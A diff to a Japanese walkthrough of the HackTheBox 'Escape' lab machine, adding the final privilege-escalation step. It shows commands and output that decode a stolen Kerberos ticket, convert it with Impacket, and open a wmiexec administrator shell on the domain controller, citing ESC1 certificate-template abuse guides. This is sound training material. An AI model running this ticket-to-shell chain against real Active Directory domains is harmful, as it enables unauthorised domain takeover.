@@ -261,7 +261,37 @@ Cached Tickets: (1)
 	Cache Flags: 0x1 -> PRIMARY
 	Kdc Called:
 ```
+
+あとは、kirbiのbase64をデコードして、ccacheに変換して、ケルベロス認証でadminのシェルをとる：
+ 
+ ```
+ ╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
+╰─$ sed 's/^      //g' kirbi_b64 | tr -d '\n' | base64 -d > admin.kirbi
+
+
+╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
+╰─$ impacket-ticketConverter admin.kirbi admin.ccache                                          
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] converting kirbi to ccache...
+[+] done
+                                                                                                                                                                                               
+╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
+╰─$ export KRB5CCNAME=admin.ccache                                              
+                                                                                                                                                                                               
+╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
+╰─$ impacket-wmiexec -k -no-pass sequel.htb/administrator@dc.sequel.htb 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+sequel\administrator
+```
  
  参考：
  - [From Misconfigured Certificate Template to Domain Admin(Read Team Notes)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
  - [Misconfigured Certificate Templates - ESC1 (Hack Tricks)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1)
+
+bloodhound, winpeas, adPEAS等々色々やったが、privescのできそうになく、最終的に上記の方法でprivescした
